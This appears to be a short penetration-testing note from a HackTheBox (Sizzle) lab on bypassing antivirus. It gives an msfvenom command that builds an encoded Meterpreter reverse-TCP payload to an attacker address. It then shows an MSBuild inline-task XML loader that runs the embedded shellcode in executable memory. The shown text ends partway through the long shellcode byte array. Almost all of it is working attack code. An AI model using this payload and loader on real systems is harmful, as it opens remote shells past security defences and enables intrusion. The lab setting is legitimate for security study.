# Bypassing AV

{% embed url="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" %}

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp
```

\
![](https://0xrick.github.io/images/hackthebox/sizzle/36.png)\
\
Then I added the shellcode to `shellcode.xml` `shellcode.xml` :

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[3189] {
0xb8,0xfe,0x59,0x88,0xe3,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0x66,
0xb9,0x17,0x03,0x31,0x43,0x14,0x83,0xc3,0x04,0x03,0xbd,0x49,0x6a,0x16,0xfb,
0x0b,0x0e,0xdf,0x65,0x10,0x07,0x06,0xed,0x83,0x6c,0xe6,0x24,0x05,0xea,0xa0,
0x39,0x96,0x70,0x15,0x41,0xa9,0x21,0x89,0x4a,0x9e,0xde,0x4f,0xd8,0x9d,0x21,
0xc8,0xc2,0xc7,0x98,0x1a,0x36,0x5c,0xec,0xe2,0xa0,0x84,0x61,0x2a,0x53,0xe7,
0x00,0x93,0xe2,0x70,0x85,0x85,0xda,0x7c,0xc7,0xc4,0x6e,0x4c,0xba,0xc5,0x5c,
0x9f,0x56,0x88,0x1d,0x4a,0xcb,0x5a,0x6f,0x86,0x40,0x46,0x26,0x80,0xf3,0x06,
0x39,0x4e,0xc2,0x43,0x48,0x82,0x98,0x06,0xa1,0x6b,0x45,0xbb,0x79,0xeb,0x4f,
0x4f,0x57,0x2f,0x6e,0x01,0xbc,0x9f,0x7b,0x2b,0xee,0x21,0x0c,0x5e,0x01,0xcf,
0xbb,0x1e,0x12,0x2f,0xf2,0xa7,0x1f,0x9c,0xa5,0x95,0x57,0x21,0x77,0xe6,0x03,
0x16,0x5a,0x09,0x8a,0x0b,0xb6,0x9f,0x70,0x88,0x1a,0xe7,0xae,0xdb,0xd4,0xc0,
0x3f,0xcd,0x53,0x49,0x21,0x97,0x7d,0xce,0xca,0x85,0xd8,0x94,0x12,0x73,0x81,
0x13,0xda,0x63,0xcf,0xa8,0x77,0xfa,0xa4,0x96,0xc8,0x18,0x2a,0xad,0x04,0xa8,
0x56,0xfc,0x6c,0x89,0xef,0x15,0xff,0xc1,0xa5,0x4b,0xb4,0xa4,0x3c,0xbc,0xf6,
0xeb,0x10,0x99,0xaa,0x81,0x73,0x33,0x5d,0xc9,0x5c,0x71,0x8f,0x45,0x30,0x6e,
0x8b,0x3a,0xc2,0x2d,0x09,0x7e,0x0f,0x34,0xea,0xb5,0x4b,0xfd,0x39,0x97,0x8b,
0xe1,0xb8,0x31,0xaa,0xe9,0xe1,0x0c,0x0f,0xda,0x49,0x1b,0xfd,0xf4,0x82,0x3c,
0x80,0x00,0x81,0x42,0x30,0xdf,0xe4,0x9f,0x9f,0xa9,0xa7,0x6e,0x27,0xe5,0x32,
0xf6,0x4b,0x90,0x52,0xb7,0x53,0xa2,0x5a,0xc2,0x47,0xdf,0x10,0x67,0x38,0xab,
0xbe,0x8b,0x34,0xa1,0x86,0x39,0x3e,0x16,0x6c,0xbc,0xcf,0x4f,0x17,0x30,0x1d,
0xa7,0x55,0x35,0x8b,0x51,0xeb,0xdc,0x78,0xac,0xed,0x41,0x75,0xdb,0x91,0x08,
0x4b,0x0f,0x32,0xd6,0x0c,0x16,0xa5,0xca,0x80,0xd3,0xad,0x44,0x7d,0x86,0x09,
0xf1,0xcd,0x9c,0x65,0x7c,0xff,0xc7,0x2b,0x90,0xa6,0xd0,0x38,0xb1,0x57,0x7f,
0xcb,0x98,0xec,0xee,0x22,0x96,0x5f,0xcf,0xca,0x2e,0x1f,0x2e,0x6a,0x63,0x27,
0x74,0xc2,0xe1,0xed,0x8c,0x87,0x98,0x2e,0xb6,0x9f,0x28,0x64,0x07,0xa7,0xda,
0x51,0x56,0x05,0xa5,0x4e,0xcf,0xd5,0x9a,0x39,0x76,0x51,0x2c,0xd3,0x32,0xbf,
0x47,0x5d,0xee,0xa6,0xd9,0xa1,0x6c,0xd6,0x73,0x5f,0x76,0x63,0x14,0xcf,0xb2,
0x6f,0x66,0x82,0xe7,0x96,0xdf,0x25,0x21,0x24,0x12,0x71,0x68,0x42,0xf1,0xdd,
0xa9,0x8a,0xe0,0xd4,0xaa,0x4e,0x10,0x68,0xe0,0x84,0x76,0xe0,0xf4,0x63,0x93,
0x74,0x1c,0xa6,0x4d,0x27,0x5b,0x79,0xfd,0x82,0x64,0x0a,0xbd,0xf0,0x37,0xf1,
0xd3,0xb7,0x7f,0x0a,0x39,0x8f,0x26,0x24,0x1f,0x4b,0xc4,0x34,0x73,0xc2,0xd1,
0xab,0x70,0x2d,0x65,0x6b,0x1c,0x1c,0x9f,0x9e,0xaf,0x13,0xbb,0xef,0x1c,0x9d,
0x64,0x53,0x39,0x17,0x00,0x0d,0x69,0x4b,0x3f,0x21,0x2f,0x7c,0xcb,0xe3,0xf7,
0x53,0x75,0xc2,0xa2,0x26,0x58,0xc5,0x37,0x94,0x32,0xc1,0x4d,0xa0,0x67,0xa3,
0xad,0x16,0x0d,0xd7,0xd8,0x85,0x78,0xc3,0xcf,0x4c,0x2b,0x95,0x45,0x2c,0xbf,
0x60,0x2b,0x26,0x49,0x29,0xbc,0xa6,0xce,0xde,0xed,0xf3,0x01,0x41,0xee,0xa1,
0xbd,0x05,0x2d,0xd7,0x7e,0xd7,0xcc,0xd9,0x22,0x2e,0x0d,0x22,0x51,0xc5,0xfa,
0x6c,0x6c,0xfa,0xab,0x0e,0x2f,0x3a,0x01,0xdc,0x2d,0xaa,0xf8,0x3d,0x88,0xd4,
0xfe,0xa0,0xd5,0x19,0x7c,0x76,0x0d,0x87,0xd1,0x4d,0x50,0x4a,0x48,0xd2,0xd1,
0xcf,0x38,0xbb,0xac,0xf4,0xd2,0x8a,0x2a,0x1e,0x0a,0x5b,0x84,0xdd,0x4a,0x70,
0x16,0xaa,0x0d,0x9d,0xb3,0xc1,0x6f,0x8d,0x36,0x7d,0xd0,0xec,0x19,0xd1,0xcb,
0x8b,0x93,0xd4,0x27,0x3e,0x8d,0x01,0x02,0xb8,0x49,0x7f,0xb5,0x70,0xeb,0xa9,
0xe9,0xc5,0xf1,0xac,0x08,0xab,0x3d,0xfa,0xa5,0x07,0x31,0x03,0x33,0x00,0xf9,
0xf6,0x12,0xfb,0x10,0x59,0x64,0x60,0x81,0xf5,0x60,0xf7,0x14,0xd9,0xdf,0x72,
0xe2,0x20,0xfb,0x4a,0x1d,0xf1,0x58,0x1b,0x12,0x36,0x2d,0x3c,0x8d,0xc0,0xa8,
0x28,0x57,0x0b,0x9b,0x1c,0x05,0x26,0x07,0x86,0xe2,0x85,0x8a,0xa1,0x6a,0x6d,
0x28,0x0f,0x18,0x84,0x0f,0xe1,0xf2,0xff,0x32,0xab,0x0c,0x12,0x33,0x5b,0xca,
0x72,0x4b,0x9e,0x14,0x2d,0xeb,0x59,0xed,0x4f,0x3b,0xef,0x43,0x7c,0x99,0xdc,
0x08,0x35,0x76,0x45,0xd9,0x16,0x76,0xc6,0xb7,0x7f,0xa4,0xaf,0x03,0x87,0x91,
0x27,0x10,0x9b,0x99,0x2b,0xb3,0xe1,0xca,0x5d,0xee,0x45,0x60,0x34,0x44,0x2c,
0x1c,0x9c,0x5e,0x13,0x15,0x16,0x50,0x56,0xec,0x17,0xd7,0x38,0xaa,0xb3,0x2c,
0xc5,0xea,0x32,0x7e,0x25,0x1f,0xd6,0x95,0x1d,0xa3,0x44,0xbf,0x8c,0x53,0x3b,
0x06,0xcf,0x1a,0x46,0x75,0x54,0x01,0x76,0x39,0x33,0x7a,0x55,0x5a,0x48,0xe5,
0xe4,0xad,0x6c,0x65,0x6b,0x12,0x2a,0xe7,0xbe,0x8f,0x4f,0x33,0x19,0xd4,0x31,
0xac,0x4f,0x11,0xcc,0x18,0xe7,0x61,0x44,0x7b,0xa8,0x9c,0x6b,0xd1,0xdf,0x35,
0xb1,0xbf,0x15,0x78,0x57,0x02,0x73,0x92,0x23,0x32,0x92,0xb1,0xe6,0xe4,0x2d,
0x09,0x42,0xea,0xcd,0x05,0x3e,0x04,0xe7,0x83,0xc0,0xfa,0x89,0x68,0x0c,0x49,
0xec,0x8f,0x42,0x88,0xe5,0xbe,0xbe,0xe2,0x09,0xc1,0x0f,0x60,0xb7,0x7f,0x47,
0xf1,0xc8,0x7c,0xbf,0x22,0x8d,0x28,0x5b,0x0d,0x1f,0xb4,0xa9,0x46,0xea,0x5c,
0x48,0x0a,0x00,0x66,0xc6,0x55,0xcc,0x7e,0x34,0xe7,0x19,0xd3,0x77,0x95,0x8c,
0x0d,0x2d,0x47,0x3a,0xb5,0x79,0x14,0x92,0x80,0xd2,0xb4,0x8a,0xad,0x1b,0x7a,
0x94,0xa2,0x5a,0xc1,0x95,0xf0,0x0b,0x7d,0x75,0x6e,0x2f,0x34,0x3f,0x2f,0xeb,
0xca,0x4e,0x35,0x71,0x5f,0x41,0x45,0x0f,0x76,0x3f,0x13,0x67,0xe3,0x73,0xba,
0xb0,0xa5,0x92,0x44,0x32,0x0d,0x61,0x2b,0xee,0x57,0xef,0x76,0xeb,0xd5,0x99,
0x92,0xff,0xec,0xf5,0x88,0xa0,0xd3,0xfc,0xec,0xbf,0xcd,0x31,0xf3,0x40,0x63,
0xeb,0xc8,0xc6,0x74,0xc1,0xe5,0xf3,0xf2,0x1a,0x21,0x5f,0xef,0x8a,0x3c,0x3e,
0x96,0x78,0xb7,0xdf,0xc2,0x4c,0xf3,0x73,0xee,0x5d,0xe6,0x28,0x93,0xe4,0xd5,
0x8f,0x03,0xf7,0xe9,0x62,0x17,0xfc,0xec,0x5e,0x7e,0xc7,0x52,0x10,0x8a,0x0d,
0x21,0xf8,0xd2,0x4e,0x74,0xbe,0x8c,0x6b,0x15,0x28,0xa7,0x41,0xc5,0x74,0x15,
0x1d,0xa5,0x33,0x8a,0x06,0xa1,0x93,0xc0,0xe9,0x8a,0x62,0x1c,0x45,0x63,0xaa,
0xd6,0x09,0x8d,0xd6,0xd9,0xac,0x2f,0x98,0xcc,0xdc,0xa2,0x11,0x5e,0x39,0xb6,
0xcf,0x00,0xc9,0xb1,0x55,0xad,0x39,0x0a,0xb3,0xa1,0x66,0x43,0x8f,0x5d,0xbd,
0x57,0x37,0xc8,0xb2,0xa9,0x05,0xe2,0xaa,0xa7,0x6c,0x48,0xce,0x31,0x91,0xd6,
0x04,0xb9,0x7b,0xcd,0xe0,0x6d,0x82,0x16,0x8e,0x4b,0x20,0x87,0x82,0x00,0x37,
0x3e,0xf0,0x31,0x27,0xe4,0xd2,0xa8,0x90,0x54,0x99,0x98,0xaa,0xab,0xea,0x08,
0xad,0xa6,0xf9,0x18,0x57,0x52,0xdf,0xa6,0xf0,0x0c,0x5b,0xa8,0x6a,0xed,0x18,
0xd8,0x0d,0x41,0x42,0x7d,0x30,0x4d,0x73,0x8b,0x1b,0x3a,0x10,0xb8,0xcf,0x8d,
0x55,0xbb,0x25,0x1e,0x2f,0x15,0xc6,0x7b,0x64,0x64,0x99,0x3e,0xc7,0x1c,0xb1,
0xf8,0x18,0x26,0x5e,0x42,0xeb,0x20,0xbd,0xcb,0x55,0x00,0x8a,0xe0,0x83,0xa0,
0x81,0xd5,0x92,0x50,0xcb,0x79,0x40,0xde,0x15,0x1c,0x19,0x32,0x3b,0xc2,0x3a,
0x98,0x1a,0x07,0x92,0xbc,0x49,0x4a,0x93,0x55,0xf2,0x31,0x73,0x80,0x2a,0x92,
0x25,0xf4,0xac,0xeb,0xc8,0xe6,0x9b,0x08,0x9c,0x8a,0x51,0x64,0x4c,0xd0,0x22,
0x88,0x0e,0xba,0x96,0x7e,0x6a,0x45,0x7b,0x3d,0x78,0xfe,0xd1,0xdd,0x25,0x4c,
0x50,0xa1,0x24,0x55,0xae,0x7d,0xe7,0x2f,0xbd,0xb8,0x82,0x6e,0xe8,0x97,0x1a,
0x56,0x3f,0x52,0x42,0xc6,0x07,0x66,0x32,0xf8,0x60,0xe5,0x91,0x98,0x30,0x3b,
0x2a,0xe9,0x47,0xb0,0x04,0x65,0x6a,0x8d,0x55,0xac,0x60,0xe2,0xd6,0xc6,0x68,
0x26,0xfe,0x18,0x5b,0x3c,0xe2,0x6b,0x20,0x40,0x31,0x05,0xd1,0xec,0x84,0x2c,
0x60,0x31,0xce,0x4a,0x77,0xcb,0xec,0x95,0x88,0x78,0x0b,0x12,0x71,0x9f,0x98,
0x91,0x67,0x8d,0xb1,0x29,0xab,0xb4,0xd7,0xb8,0x73,0x67,0xa2,0x3f,0xc8,0xcf,
0x3b,0x5c,0xbd,0x62,0x69,0x6b,0x41,0x59,0x0c,0x05,0xae,0xb2,0xf3,0xb4,0xe4,
0x66,0x60,0x9f,0xa3,0xb6,0x90,0xb8,0xe6,0x1a,0x19,0xa5,0x99,0x22,0xcf,0xca,
0xa5,0xe9,0xc1,0x64,0x30,0xce,0x4f,0x85,0xfe,0x7f,0xe4,0x0a,0x07,0xa0,0x58,
0xcb,0x5e,0xcf,0x26,0x03,0xac,0x71,0x0e,0xdd,0x1c,0x0d,0x32,0xa5,0x9f,0x44,
0x2f,0xeb,0xfd,0xad,0x69,0x5c,0x29,0x11,0x72,0x1b,0xd7,0x48,0xea,0x40,0xd3,
0xc0,0x4d,0xc2,0x22,0x15,0x9b,0x33,0x64,0x47,0xab,0x90,0x22,0x90,0x0b,0x01,
0x12,0x87,0x40,0x76,0x18,0x3f,0xec,0x40,0xd3,0xba,0x86,0xc6,0x76,0x3d,0xbb,
0xc9,0x2c,0x5a,0x32,0x23,0x56,0x46,0x00,0xdc,0x8e,0x00,0x4c,0xe0,0x1a,0x04,
0xd5,0x04,0x1b,0xee,0xc5,0x90,0x2d,0x9f,0x68,0xf5,0x11,0x48,0xcf,0x2d,0x85,
0xef,0xe9,0x2b,0xc8,0x3f,0xf3,0x07,0x12,0xd7,0x23,0x93,0x5f,0x2d,0xab,0xe3,
0x9a,0x37,0x42,0xf1,0xd2,0x7e,0xdc,0x6c,0x30,0x35,0x75,0xf6,0x1a,0x1c,0x8f,
0x59,0x92,0x38,0xc7,0xb7,0x05,0xbd,0x76,0x31,0x21,0x6f,0x4c,0x6f,0x54,0xde,
0x5e,0x4a,0xb0,0x1d,0xec,0xcb,0xd2,0x13,0x28,0xcc,0xf7,0xd8,0x13,0xac,0xcf,
0x03,0x34,0xd7,0x4d,0xa2,0xdf,0x21,0x84,0x1d,0xf5,0xcc,0x64,0x8f,0x97,0xd7,
0x2b,0xa2,0x89,0xb4,0x6e,0x8d,0xb0,0x0b,0xc0,0x09,0x43,0xa2,0xbe,0x97,0xe5,
0x1d,0x58,0xe0,0x3f,0xb5,0xe5,0xe2,0xc0,0x3a,0x8e,0x2e,0xfc,0x90,0x2a,0x06,
0xaa,0xe4,0x97,0x53,0x70,0x70,0xa4,0xf2,0xce,0x8f,0x11,0x57,0x05,0xe4,0x39,
0x4c,0xf2,0x7b,0x1a,0x45,0xd1,0xce,0xc9,0xf4,0x20,0xf2,0xbd,0x13,0xdf,0xc2,
0x65,0xd0,0x5c,0x4e,0x77,0xe4,0x59,0x3d,0xa5,0xb5,0x8b,0x05,0x6d,0x9d,0x61,
0x72,0x17,0xde,0x9c,0xfd,0x4d,0x30,0x8a,0x51,0xa8,0xf6,0x47,0x85,0xff,0x7e,
0x74,0x88,0x8b,0x10,0xa1,0xee,0xaf,0xef,0xb5,0x53,0xe2,0x5c,0x36,0x8a,0x54,
0xa0,0xf5,0xd0,0x4b,0x5f,0x0e,0x74,0x49,0x72,0x9e,0xc5,0x66,0xbd,0xca,0x2d,
0x20,0x16,0x16,0x1c,0x83,0x59,0x08,0xbb,0x5b,0x1d,0x8f,0x91,0xda,0xb5,0xa7,
0xe6,0xda,0xb7,0xfb,0x8a,0x32,0xc3,0x2f,0x73,0xe0,0x27,0x4c,0x07,0x19,0x49,
0xf8,0x55,0xba,0x69,0x64,0xf9,0xad,0xd5,0x2a,0xa5,0xab,0xfd,0x3b,0x5c,0x7d,
0x73,0xc7,0xf9,0x65,0x62,0xc3,0xc6,0xd7,0x3f,0x10,0x9e,0x0d,0x35,0x52,0xb7,
0x4e,0x17,0xdf,0x7d,0x59,0x47,0xfb,0xf1,0x02,0x58,0x25,0xf6,0xe9,0x59,0x9c,
0xf6,0x70,0xc4,0x19,0x66,0x01,0x81,0xb5,0xde,0x7a,0x28,0xbf,0x45,0x66,0xc5,
0x96,0x7e,0x55,0x09,0x21,0x58,0x7c,0xcf,0x34,0x66,0x67,0x9e,0xd3,0x55,0x63,
0x3f,0x01,0x1f,0x14,0x42,0x4b,0x29,0xca,0x89,0x27,0xc7,0x0f,0x77,0xb0,0xe6,
0x13,0x3d,0x37,0x15,0xc0,0x2b,0x5e,0x40,0x20,0x86,0x30,0x0d,0xc5,0x46,0x98,
0xab,0xb0,0x2b,0x92,0xc5,0x22,0x21,0x92,0xf6,0x1c,0x03,0x27,0x0a,0x7c,0x84,
0x4b,0x54,0x0a,0xf3,0x6e,0xc6,0x50,0xe5,0xf6,0x28,0x9b,0x7d,0xa5,0xa3,0x21,
0x75,0xaa,0xb0,0xd7,0xf3,0xa0,0xa5,0xd0,0x7f,0x90,0x75,0xf1,0x16,0x8b,0x98,
0x70,0x15,0x5a,0xc5,0x58,0x38,0xc1,0xaf,0x87,0xbb,0xce,0x65,0x2f,0x6d,0xb1,
0x2d,0x69,0x47,0x4d,0x34,0xf9,0x02,0xb9,0x66,0x4f,0x93,0xe2,0x7c,0x26,0x76,
0x01,0x12,0x1e,0x86,0x81,0x69,0x8d,0xa5,0x31,0x67,0x1b,0x61,0x5b,0x02,0xb4,
0x21,0xa9,0x70,0xbe,0xbb,0x23,0x22,0x6d,0x1d,0xc8,0x19,0x23,0x41,0xfc,0x6c,
0x41,0x12,0x17,0xbf,0x99,0x4e,0x9c,0xc2,0x5c,0x18,0xbf,0xcc,0x1a,0xb4,0x2d,
0x9e,0x26,0xa5,0x7d,0x1e,0xdc,0x50,0x1f,0xd9,0x0a,0x79,0xf3,0x29,0x16,0xb6,
0x49,0xda,0x55,0x51,0xc9,0x54,0x2e,0x46,0x68,0x9b,0xec,0x3b,0xd4,0x61,0x27,
0x50,0x3a,0x47,0x74,0x62,0x07,0x0f,0x83,0xcd,0xc2,0x26,0x20,0xb7,0xa3,0xd7,
0x0e,0xa6,0x6c,0xfd,0xb0,0x2f,0xd5,0x0f,0x6f,0x35,0x5d,0x4f,0x2b,0x14,0xe7,
0xca,0x6f,0x78,0x0e,0xfb,0x09,0x5c,0x25,0x0c,0x99,0xc4,0xa5,0x92,0x30,0x3e,
0xbb,0x4c,0x46,0xa9,0xa0,0xe6,0xf0,0x75,0x12,0xad,0x6c,0xc1,0xef,0xcc,0xf2,
0x67,0x5f,0x22,0xff,0xa1,0x53,0xad,0xc5,0x57,0x8b,0xcc,0x0a,0xd5,0x94,0xa8,
0x91,0x41,0xc2,0x47,0xd5,0xa1,0x27,0x1f,0x0b,0x47,0x2d,0xa8,0xf4,0xc6,0xdb,
0x5d,0x17,0x36,0x44,0x23,0x26,0x30,0xa8,0xd6,0x97,0x93,0xf2,0x48,0x7c,0x34,
0xbd,0x94,0xb9,0xa2,0x5e,0x78,0x66,0xde,0xbf,0x31,0x7e,0x5a,0x7f,0xbc,0xe9,
0xaa,0x7a,0x00,0xaa,0x8f,0xc8,0x15,0x65,0x84,0x6c,0x1e,0x95,0x43,0xc3,0x82,
0x0a,0x65,0x16,0x73,0xe3,0x47,0xe6,0xfa,0x62,0x80,0x9f,0xa9,0x28,0x8c,0x4c,
0xbd,0xe2,0xbb,0x82,0x8b,0xd1,0x80,0x00,0x84,0x6d,0x8d,0x80,0x4e,0x7d,0xce,
0x84,0x91,0x94,0x74,0x8c,0x30,0xc9,0x49,0x59,0x7b,0x9c,0x0d,0x06,0x60,0x3d,
0x12,0xaf,0x55,0x33,0x12,0x51,0xcb,0x05,0x53,0x8b,0x29,0xcb,0xd5,0xd2,0x00,
0xc7,0x73,0xda,0x2a,0x5a,0x6d,0x34,0xed,0x5d,0x61,0xec,0xb0,0xe6,0x0a,0x23,
0x61,0xa9,0xd5,0x1d,0x97,0x01,0x0b,0x98,0xfe,0x8b,0xad,0x16,0x2e,0x96,0x87,
0xd8,0x86,0xc3,0x46,0xeb,0xd0,0x41,0x6c,0x10,0xa4,0xd2,0xdf,0x07,0x4e,0x7f,
0x65,0x66,0x99,0x40,0x5f,0xdb,0x8d,0x85,0xd4,0x0d,0x1a,0xe3,0x5f,0x3a,0x38,
0x5c,0x4e,0xeb,0xa1,0x5a,0xfc,0x46,0x78,0xc6,0xa6,0x3d,0x6a,0x04,0x2a,0x07,
0xf5,0x3d,0xac,0x08,0xe9,0x22,0x13,0xa9,0x75,0x78,0x81,0xd1,0x3c,0x93,0x4b,
0x44,0x18,0x8b,0xfa,0xef,0xa2,0xb4,0x91,0x52,0xae,0x4b,0xae,0xf2,0x8e,0xdf,
0xac,0x96,0xf1,0xde,0x18,0x40,0x5f,0x13,0x5c,0xe6,0xa8,0x39,0x04,0x05,0x00,
0x53,0xfb,0x69,0x4c,0x93,0x0a,0x88,0x25,0x28,0xbc,0xdd,0xde,0xc6,0xcf,0x55,
0x7e,0x7b,0xef,0x95,0x34,0x6b,0x0d,0x04,0x4d,0x02,0xd9,0x6e,0x86,0xce,0xf0,
0x2d,0xd8,0x79,0x68,0xde,0x1c,0xe7,0xf5,0xc4,0x94,0x38,0xc4,0x6a,0xdd,0x2a,
0x37,0x7c,0xfe,0x42,0x2a,0x5d,0xf3,0xae,0xeb,0x09,0x99,0xfa,0x52,0xc4,0x9c,
0x67,0xd7,0x33,0x8b,0x3d,0xc3,0xa3,0x95,0x5d,0x3c,0x83,0x3b,0xcf,0x23,0x25,
0x7f,0xbe,0x42,0x11,0xb8,0x44,0xba,0xf5,0xf7,0xfa,0x76,0xfb,0xe8,0xc5,0x74,
0xa8,0x7e,0x5b,0xef,0xa7,0x98,0x54,0x6f,0x81,0x5f,0x72,0x9f,0x89,0xc1,0xcc,
0x7d,0x93,0xa8,0xee,0x2c,0x41,0x8f,0x09,0xbe,0x3f,0x9e,0xc5,0x9c,0x73,0xaf,
0xe3,0x38,0x67,0x5e,0xa8,0x01,0xd7,0xce,0x5b,0xcb,0x63,0xfc,0x11,0x52,0xbc,
0x5e,0xc8,0xa6,0x79,0x54,0x65,0xf0,0xcf,0xe0,0x10,0xbd,0x90,0x4f,0x89,0xde,
0xd0,0x8c,0xbd,0xbb,0x61,0x46,0xd6,0x5e,0xff,0x90,0x32,0x77,0x0a,0xb4,0x7f,
0x84,0xee,0xbc,0x91,0x62,0x12,0x9d,0x29,0x02,0xcd,0x64,0x3a,0x35,0x06,0x49,
0x4d,0xa3,0xe5,0x00,0x88,0x5f,0xc0,0xa3,0x07,0xcb,0xc7,0x61,0x1b,0x36,0x19,
0x0e,0xe3,0x28,0x35,0x8e,0xa2,0xc3,0xc0,0xa1,0xc9,0x50,0x34,0xe8,0xb4,0x85,
0x9a,0x8d,0x12,0xe3,0x4d,0xaa,0xcb,0x5c,0x5c,0xc8,0xe2,0xcb,0xe9,0x44,0x68,
0x3a,0x82,0x1c,0x53,0xf6,0x54,0xab,0xda,0x85,0xb8,0x9e,0x3a,0xd8,0xce,0x33,
0x13,0xc4,0x24,0xed,0x99,0x83,0xfb,0xb0,0x90,0x63,0xc2,0xa8,0x97,0xbc,0x40,
0xe7,0xc9,0x6d,0x17,0x58,0x54,0xf6,0x72,0x63,0x3a,0x41,0x43,0xe3,0xa6,0xbc,
0x2d,0xd3,0xe0,0x0c,0x9a,0x10,0xcf,0x7a,0x3c,0xad,0xcf,0x6b,0x39,0xb2,0x74,
0x3e,0xef,0xd9,0xc7,0xe7,0x2e,0x46,0x7e,0xb8,0xd6,0x2a,0x54,0x47,0x59,0x0c,
0xe1,0x18,0x90,0xd1,0xa0,0x00,0x76,0x59,0x14,0x86,0xe5,0xb6,0x31,0xf4,0x9b,
0xea,0x01,0x43,0xf0,0x8c,0xc9,0x36,0x9d,0x9d,0x40,0xe1,0x0f,0xcc,0xdd,0xb6,
0x8f,0x49,0xfa,0x2c,0x89,0xb8,0x4e,0x7b,0x18,0x25,0x60,0x7e,0x7f,0x54,0xcc,
0xfa,0x07,0x7a,0x67,0x72,0xb3,0x89,0xf8,0x66,0x41,0x6b,0x34,0x03,0x11,0x12,
0xd1,0xdd,0x39,0x36,0x30,0x23,0xdf,0x87,0xa2,0x65,0x61,0x66,0x1f,0x54,0x3f,
0x46,0xb5,0x74,0x71,0xb9,0x38,0x8a,0xb4,0xa0,0xfc,0x3c,0x43,0xec,0x51,0xc6,
0x6f,0xab,0xde,0x4d,0xd1,0x7e,0x45,0xb5,0x08,0x85,0x41,0x25,0x58,0x02,0x26,
0xdf,0x24,0xcd,0x06,0x41,0x4f,0x96,0xe4,0x13,0x43,0xc0,0x05,0xf7,0xac,0x31,
0x89,0x1d,0x42,0x7d,0x47,0x83,0x3b,0x41,0x64,0xc2,0xba,0x3b,0x38,0xdb,0xde,
0x32,0x26,0x3c,0xe7,0xab,0x5c,0x01,0x37,0x35,0x32,0x1a,0x25,0xa2,0x30,0x69,
0xf0,0x2c,0xfe,0x5a,0x9b,0x94,0xc7,0x3d,0xfb,0x37,0x74,0x4e,0x58,0xef,0x78,
0xd6,0xdf,0xbd,0x18,0x34,0x09,0xd4,0x6d,0xca,0x47,0xb6,0xbf,0x77,0xf8,0x31,
0x2b,0xc2,0x1f,0xf9,0x93,0x98,0xaf,0xe5,0x86,0xe3,0x35,0xc6,0x57,0xdf,0x17,
0x1d,0x0a,0xec,0x3e,0x45,0xb2,0xc8,0xa8,0x45,0x70,0xc2,0x8d,0xe8,0x05,0x68,
0xb2,0xd1,0x36,0x67,0x63,0xd6,0xa9,0x82,0x99,0x14,0x98,0x45,0xc1,0x3c,0x87,
0x21,0xb2,0x6c,0x71,0x72,0xb1,0x80,0x11,0x74,0x05,0xed,0x15,0x96,0x88,0x9b,
0x44,0x16,0x10,0xa7,0x00,0x02,0xf2,0x77,0xa5,0xc1,0xdf,0xe3,0xd9,0xd6,0xf9,
0xfd,0xb0,0x27,0x0a,0x07,0x31,0xf4,0x4f,0x22,0x7d,0xc1,0x20,0xbd,0x87,0x30,
0x99,0xd9,0x52,0xcf,0xa4,0x79,0x10,0x01,0x33,0x59,0xc9,0x89,0xa6,0xd5,0xb8,
0xd0,0xe7,0x80,0x7b,0xe4,0xc3,0x3b,0x9d,0x9c,0x9d,0x9c,0xea,0xba,0xab,0x54,
0x4a,0x87,0xe1,0x7d,0x71,0xe9,0xe9,0xbb,0xd9,0x17,0xdc,0xd3,0x3f,0xbf,0x4c,
0x7f,0xcd,0xde,0xa0,0x64,0x41,0x20,0xb4,0x24,0x30,0x57,0xcf,0xe8,0x04,0xc2,
0xe4,0x7c,0xb2,0xa5,0x28,0x33,0x6c,0xe8,0x7b,0x9a,0xac,0xc9,0x0c,0xb3,0xb7,
0x48,0xbd,0xb3,0x6a,0xf1,0xfc,0x31,0xcb,0x21,0x39,0x32,0x97,0x7b,0x3c,0x9e,
0x66,0xfa,0xca,0xfe,0xa3,0xcb,0x41,0x2f,0x0f,0x4b,0x6d,0x0b,0x54,0x78,0x2e,
0x85,0x51,0xa5,0x51,0x76,0xef,0xf5,0xf3,0xa7,0xff,0x4a,0x5f,0x7b,0x8d,0xb0,
0x15,0x85,0x78,0xbb,0xd3,0x0a,0x21,0x46,0x3f,0xeb,0x6c,0x9b,0xed,0xd5,0x80,
0xaa,0xf2,0x6b,0x48,0xb1,0x88,0x39,0x3c,0xa8,0x68,0x50,0x06,0xb5,0xa5,0x23,
0x6c,0x8e,0x0c,0xa5,0x95,0x38,0x45,0xfc,0xf5,0xe8,0x7a,0xcb,0xf6,0x91,0xd9,
0xbc,0x9a,0x4b,0x1a,0x60,0xb1,0xc6,0xa7,0xc5,0x0e,0x4b,0xc1,0x74,0xc7,0x74,
0x0e,0xe2,0xdb,0xca,0xce,0xee,0xf4,0x5d,0x80,0xa6,0x7f,0x05,0x8c,0xf1,0xa4,
